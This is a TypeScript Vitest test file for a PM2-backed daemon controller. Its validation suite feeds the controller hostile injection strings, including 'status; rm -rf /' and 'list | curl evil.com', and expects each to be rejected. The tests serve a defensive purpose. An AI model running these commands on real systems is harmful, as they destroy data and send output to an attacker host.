/**
 * Tests for DaemonController lifecycle management (PM2-backed).
 *
 * Uses `vi.mock` for `child_process.execSync` to avoid running real PM2 commands.
 * Tests verify the controller correctly delegates to PM2 CLI and parses results.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { existsSync, mkdtempSync, mkdirSync, rmSync, writeFileSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";

// ---------------------------------------------------------------------------
// Mock execSync so the controller never launches real PM2 commands
// ---------------------------------------------------------------------------

const mockExecSync = vi.hoisted(() => vi.fn());

vi.mock("child_process", () => ({
  execSync: mockExecSync,
  spawn: vi.fn(),
}));

import { DaemonController } from "./daemon-controller";

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Helper to create a mock PM2 jlist response for a specific app */
function makePm2List(overrides: Partial<{ status: string; pid: number; uptime: number; restarts: number; memory: number }> = {}) {
  return JSON.stringify([{
    name: "dynatrader",
    pid: overrides.pid ?? 12345,
    pm2_env: {
      status: overrides.status ?? "stopped",
      pm_uptime: overrides.uptime ?? Date.now() - 60_000,
      restart_time: overrides.restarts ?? 0,
    },
    monit: {
      memory: overrides.memory ?? 50_000_000,
    },
  }]);
}

// ---------------------------------------------------------------------------
// Command validation
// ---------------------------------------------------------------------------

describe("pm2 command validation", () => {
  let controller: DaemonController;
  let tempDir: string;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), "dynad-cmdtest-"));
    controller = new DaemonController(tempDir);
    mockExecSync.mockReset();
  });

  afterEach(() => {
    try { rmSync(tempDir, { recursive: true, force: true }); } catch { /* ignore */ }
  });

  it("should reject a command with semicolon injection", () => {
    expect(() => (controller as unknown as { pm2Exec: (cmd: string) => string }).pm2Exec("status; rm -rf /")).toThrow();
  });

  it("should reject a command with pipe injection", () => {
    expect(() => (controller as unknown as { pm2Exec: (cmd: string) => string }).pm2Exec("list | curl evil.com")).toThrow();
  });

  it("should reject a command with command substitution", () => {
    expect(() => (controller as unknown as { pm2Exec: (cmd: string) => string }).pm2Exec("status `whoami`")).toThrow();
  });

  it("should reject a command with dollar sign expansion", () => {
    expect(() => (controller as unknown as { pm2Exec: (cmd: string) => string }).pm2Exec("status $HOME")).toThrow();
  });

  it("should reject a command with ampersand backgrounding", () => {
    expect(() => (controller as unknown as { pm2Exec: (cmd: string) => string }).pm2Exec("status &")).toThrow();
  });

  it("should reject an unknown command not in allowlist", () => {
    expect(() => (controller as unknown as { pm2Exec: (cmd: string) => string }).pm2Exec("hack")).toThrow();
  });

  it("should accept a valid PM2 status command", () => {
    mockExecSync.mockReturnValue("some output");
    const result = (controller as unknown as { pm2Exec: (cmd: string) => string }).pm2Exec("status");
    expect(result).toBe("some output");
  });

  it("should accept a valid PM2 start command with path argument", () => {
    mockExecSync.mockReturnValue("online");
    const result = (controller as unknown as { pm2Exec: (cmd: string) => string }).pm2Exec('start "/path/to/config"');
    expect(result).toBe("online");
  });

  it("should accept all valid PM2 commands from the allowlist", () => {
    const validCommands = [
      "status", "list", "monit", "start app.js", "stop app",
      "restart app", "delete app", "save", "describe app",
      "show app", "pid app", "pretty", "jlist", "slmt",
      "startup", "unstartup",
    ];
    for (const cmd of validCommands) {
      mockExecSync.mockReturnValue("ok");
      expect(
        () => (controller as unknown as { pm2Exec: (cmd: string) => string }).pm2Exec(cmd)
      ).not.toThrow();
    }
  });
});

// ---------------------------------------------------------------------------
// Suite
// ---------------------------------------------------------------------------

describe("DaemonController", () => {
  let controller: DaemonController;
  let tempDir: string;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), "dynad-test-"));
    controller = new DaemonController(tempDir);
    mockExecSync.mockReset();

    // Create mock ecosystem.config.cjs and dist/daemon.js in the temp package root
    // The controller resolves packageRoot = workspacePath/.., so these go one level up
    const pkgRoot = join(tempDir, "..");
    const ecosystemPath = join(pkgRoot, "ecosystem.config.cjs");
    const distPath = join(pkgRoot, "dist", "daemon.js");
    if (!existsSync(distPath)) {
      mkdirSync(join(pkgRoot, "dist"), { recursive: true });
      writeFileSync(distPath, "// mock daemon", "utf-8");
    }
    if (!existsSync(ecosystemPath)) {
      writeFileSync(ecosystemPath, "module.exports = {};", "utf-8");
    }
  });

  afterEach(() => {
    try {
      rmSync(tempDir, { recursive: true, force: true });
    } catch {
      // Already gone
    }

    // Clean up any mock ecosystem.config.cjs we may have placed in the tmpdir root
    try {
      const tmpRoot = join(tmpdir(), "ecosystem.config.cjs");
      if (existsSync(tmpRoot)) rmSync(tmpRoot, { force: true });
      const tmpDistDir = join(tmpdir(), "dist");
      if (existsSync(tmpDistDir)) rmSync(tmpDistDir, { recursive: true, force: true });
    } catch {
      // Ignore cleanup errors
    }
  });

  // -----------------------------------------------------------------------
  // ecosystemPath
  // -----------------------------------------------------------------------

  describe("ecosystemPath", () => {
    it("should return the path to ecosystem.config.cjs relative to workspace", () => {
      expect(controller.ecosystemPath).toContain("ecosystem.config.cjs");
    });
  });

  // -----------------------------------------------------------------------
  // isRunning
  // -----------------------------------------------------------------------

  describe("isRunning", () => {
    it("should return false when PM2 reports no matching app", async () => {
      mockExecSync.mockReturnValue("[]");
      await expect(controller.isRunning()).resolves.toBe(false);
    });

    it("should return false when app status is 'stopped'", async () => {
      mockExecSync.mockReturnValue(makePm2List({ status: "stopped" }));
      await expect(controller.isRunning()).resolves.toBe(false);
    });

    it("should return true when app status is 'online'", async () => {
      mockExecSync.mockReturnValue(makePm2List({ status: "online", pid: 99999 }));
      await expect(controller.isRunning()).resolves.toBe(true);
    });

    it("should handle PM2 command failure gracefully", async () => {
      mockExecSync.mockReturnValue("");
      await expect(controller.isRunning()).resolves.toBe(false);
    });
  });

  // -----------------------------------------------------------------------
  // getStatus
  // -----------------------------------------------------------------------

  describe("getStatus", () => {
    it("should return correct structure when daemon is not running", async () => {
      mockExecSync.mockReturnValue("[]");
      const status = await controller.getStatus();
      expect(status.running).toBe(false);
      expect(status.pid).toBeNull();
      expect(status.uptime).toBeNull();
      expect(status.restarts).toBe(0);
      expect(status.memory).toBeNull();
      expect(status.status).toBe("stopped");
      expect(status.name).toBe("dynatrader");
    });

    it("should return running status, PID, and uptime when process is online", async () => {
      const now = Date.now();
      mockExecSync.mockReturnValue(makePm2List({
        status: "online",
        pid: 12345,
        uptime: now - 60_000,
        restarts: 0,
        memory: 100_000_000,
      }));

      const status = await controller.getStatus();
      expect(status.running).toBe(true);
      expect(status.pid).toBe(12345);
      expect(status.restarts).toBe(0);
      expect(status.memory).toBe(100_000_000);
      expect(status.status).toBe("online");
      expect(status.uptime).toBeGreaterThanOrEqual(55_000);
      expect(status.uptime).toBeLessThanOrEqual(65_000);
    });

    it("should return null uptime when PM2 provides no uptime", async () => {
      mockExecSync.mockReturnValue(JSON.stringify([{
        name: "dynatrader",
        pid: 99999,
        pm2_env: { status: "stopped", restart_time: 2 },
        monit: {},
      }]));

      const status = await controller.getStatus();
      expect(status.uptime).toBeNull();
      expect(status.restarts).toBe(2);
    });
  });

  // -----------------------------------------------------------------------
  // start
  // -----------------------------------------------------------------------

  describe("start", () => {
    it("should return false when the daemon is already running", async () => {
      mockExecSync.mockReturnValue(makePm2List({ status: "online", pid: 12345 }));
      await expect(controller.start()).resolves.toBe(false);
    });

    it("should call pm2 start with ecosystem config when not running", async () => {
      // First call: jlist returns stopped state
      // Second call: start output
      mockExecSync
        .mockReturnValueOnce(makePm2List({ status: "stopped" }))
        .mockReturnValueOnce("[PM2] Starting ecosystem.config.cjs\n[PM2] [dynatrader](v8.5.1) online");

      const result = await controller.start();
      expect(result).toBe(true);

      // Verify pm2 start was called with the ecosystem config
      const startCall = mockExecSync.mock.calls.find((call: string[]) =>
        call[0]?.includes("pm2") && call[0]?.includes("start")
      );
      expect(startCall).toBeDefined();
    });

    it("should throw when ecosystem config does not exist", async () => {
      // Create a deeply nested dir whose package root definitely has no ecosystem.config.cjs
      const nestedDir = mkdtempSync(join(tmpdir(), "dynad-nested-"));
      const deeplyNested = join(nestedDir, "workspace");
      mkdirSync(deeplyNested, { recursive: true });
      const badController = new DaemonController(deeplyNested);
      // Mock isRunning to return false so we get past the check
      mockExecSync
        .mockReturnValueOnce("[]");

      await expect(badController.start()).rejects.toThrow("PM2 ecosystem config not found");

      rmSync(nestedDir, { recursive: true, force: true });
    });
  });

  // -----------------------------------------------------------------------
  // stop
  // -----------------------------------------------------------------------

  describe("stop", () => {
    it("should return false when not running", async () => {
      mockExecSync.mockReturnValue(makePm2List({ status: "stopped" }));
      await expect(controller.stop()).resolves.toBe(false);
    });

    it("should call pm2 stop when running", async () => {
      mockExecSync
        .mockReturnValueOnce(makePm2List({ status: "online", pid: 12345 }))
        .mockReturnValueOnce("[PM2] [dynatrader] stopping");

      const stopped = await controller.stop();
      expect(stopped).toBe(true);

      // Verify pm2 stop was called
      const stopCall = mockExecSync.mock.calls.find((call: string[]) =>
        call[0]?.includes("pm2") && call[0]?.includes("stop")
      );
      expect(stopCall).toBeDefined();
    });
  });

  // -----------------------------------------------------------------------
  // restart
  // -----------------------------------------------------------------------

  describe("restart", () => {
    it("should stop then start the daemon", async () => {
      // Sequence: isRunning (online) -> stop -> isRunning (stopped) -> start
      mockExecSync
        .mockReturnValueOnce(makePm2List({ status: "online", pid: 12345 })) // isRunning for stop
        .mockReturnValueOnce("[PM2] stopping")                               // pm2 stop
        .mockReturnValueOnce(makePm2List({ status: "stopped" }))            // isRunning for start
        .mockReturnValueOnce("[PM2] Starting ecosystem.config.cjs\n[PM2] [dynatrader](v8.5.1) online"); // pm2 start

      const result = await controller.restart();
      expect(result).toBe(true);
    });
  });

  // -----------------------------------------------------------------------
  // install / uninstall
  // -----------------------------------------------------------------------

  describe("install / uninstall", () => {
    it("install should not throw", async () => {
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
      mockExecSync.mockReturnValue("[PM2] To setup the Startup Script...");
      await expect(controller.install()).resolves.toBeUndefined();
      expect(logSpy).toHaveBeenCalled();
      logSpy.mockRestore();
    });

    it("uninstall should not throw", async () => {
      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
      mockExecSync.mockReturnValue("");
      await expect(controller.uninstall()).resolves.toBeUndefined();
      expect(logSpy).toHaveBeenCalled();
      logSpy.mockRestore();
    });
  });

  // -----------------------------------------------------------------------
  // getLogPaths
  // -----------------------------------------------------------------------

  describe("getLogPaths", () => {
    it("should return paths containing dynatrader", () => {
      const paths = controller.getLogPaths();
      expect(paths.out).toContain("dynatrader-out.log");
      expect(paths.err).toContain("dynatrader-error.log");
      expect(paths.combined).toContain("dynatrader.log");
    });
  });
});
